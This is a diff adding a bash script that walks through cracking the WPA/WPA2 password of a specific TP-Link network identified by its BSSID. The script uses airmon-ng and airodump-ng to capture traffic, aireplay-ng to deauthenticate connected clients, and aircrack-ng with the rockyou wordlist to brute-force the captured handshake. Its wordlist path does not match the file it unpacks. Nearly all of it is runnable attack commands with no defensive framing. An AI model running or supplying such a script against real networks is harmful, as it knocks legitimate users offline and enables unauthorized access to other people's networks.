@@ -1,0 +1,62 @@
+#!/bin/bash
+
+BSSID="CC:32:E5:F4:02:DD"
+ESSID="TP-Link_02DD"
+test -e packets || mkdir packets
+
+
+# run it at the end to have network access again
+# sudo service network-manager start
+
+
+# link for instructions
+# https://www.geeksforgeeks.org/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
+
+
+
+# Stop the current processes which are using the WiFi interface.
+sudo airmon-ng check kill
+
+
+# switch into monitoring mode
+sudo airmon-ng
+
+
+# Step 3: To start the wlan0 in monitor mode.
+sudo airmon-ng start wlan0
+
+
+# Step 4: To view all the Wifi networks around you.
+sudo airodump-ng wlan0mon
+
+
+# Step 5: To view the clients connected to the target network.
+# !!! WAIT SOME TIME HERE. CHECK OUT COLUMN `PROBES`!!
+sudo airodump-ng -c 11 --bssid $BSSID -w ./packets/$ESSID wlan0mon
+
+
+#!! OPEN NEW TERMINAL DURING PREVIOUS COMMAND PROCESSSING
+# Open a new terminal window to disconnect the clients connected to the target network.
+# -0 : For deauthentication
+# To view the clients connected to the target network
+sudo aireplay-ng -0 10 -a $BSSID wlan0mon
+
+
+
+
+
+
+
+
+# SECOND PART
+# Bruteforce
+
+# for passwork list
+cp /usr/share/wordlists/rockyou.txt.gz .
+gunzip rockyou.txt.gz
+
+# bruteforce
+aircrack-ng -a2 -b $BSSID -w ./wordlist.txt ./packets/$ESSID-01.cap
+
+aircrack-ng -J packets/$ESSID-01 packets/$ESSID-01.cap
+
